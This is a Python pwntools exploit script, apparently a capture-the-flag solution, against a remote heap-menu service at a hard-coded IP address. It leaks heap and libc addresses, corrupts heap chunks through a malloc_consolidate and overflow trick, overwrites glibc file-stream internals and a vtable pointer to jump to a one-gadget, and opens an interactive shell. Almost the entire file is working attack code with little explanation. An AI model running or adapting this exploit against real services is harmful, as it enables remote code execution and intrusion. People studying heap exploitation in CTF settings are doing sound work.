#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#host = "10.211.55.13"
#port = 8888
host = "52.193.196.17"
port = 56746
r = remote(host,port)

def new_heap(data):
    r.recvuntil("choice:")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(data)

def del_heap(idx):
    r.recvuntil("choice:")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def add_ghost(magic,desc): 
    r.recvuntil("choice:")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(magic))
    r.recvuntil(":")
    r.send(desc)

def watch_ghost(magic):
    r.recvuntil("choice:")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(magic))

def remove_ghost():
    r.recvuntil("choice:")
    r.sendline("5")

# stage 1  : leak heap & libc 
add_ghost(123,"Da")
new_heap("a")
new_heap("a")
new_heap("a")
remove_ghost()
del_heap(0)
del_heap(2) # merge with top and trigger malloc cosolidate,and fastchunk will merge with unsorted chunk


new_heap("d")
new_heap("v")
del_heap(1) # Let chunk return to unsorted bin

# We have two chunk in unsorted bin
new_heap("2")
del_heap(0)

# Get heap address
add_ghost(0xc1,"a"*9)
watch_ghost(0xc1) # prevent merge later
r.recvuntil("a"*9)
heap = u64("\x00" +r.recvuntil("$")[:-1].ljust(7,"\x00"))
print "heap:",hex(heap)
remove_ghost()
del_heap(2)
add_ghost(56746,"a"*8)
watch_ghost(56746)
r.recvuntil("a"*8)
libc = u64(r.recvuntil("$")[:-1].ljust(8,"\x00")) - 0x3c1bf8
print "libc:",hex(libc)
remove_ghost()
del_heap(1)

# stage2
new_heap("da")
add_ghost("56746","nogg")
new_heap("da")
new_heap("da")

del_heap(0)
remove_ghost()
del_heap(2) # trigger malloc_consolidate

new_heap("d")
new_heap("a")
del_heap(0)
del_heap(1)

new_heap("a"*0xa8) # trigger the vulnerability
# add heap and delete it, let it can delete heap 0
new_heap("d")
del_heap(1)
del_heap(0)
add_ghost(12345,p64(heap+0xb0)*2) 
new_heap("a"*0x40 + p64(0) + p64(0x111) + p64(heap) + p64(heap))
new_heap("d")
#merge
del_heap(2)

del_heap(0)
new_heap("gg")
new_heap("da")
del_heap(0)
del_heap(2)
buf_end = libc + 0x3c1900
lock = libc + 0x3c3770
vtable = libc + 0x3be400
magic = libc + 0xf24cb
new_heap(p64(0)*8 + p64(0x0) + p64(0xb1) + p64(0) +p64(buf_end-0x10))
# control rip
new_heap(("\x00"*5 + p64(lock) + p64(0)*9 + p64(vtable)).ljust(0x1ad,"\x00")+ p64(magic))
remove_ghost()
del_heap(2)
r.interactive()

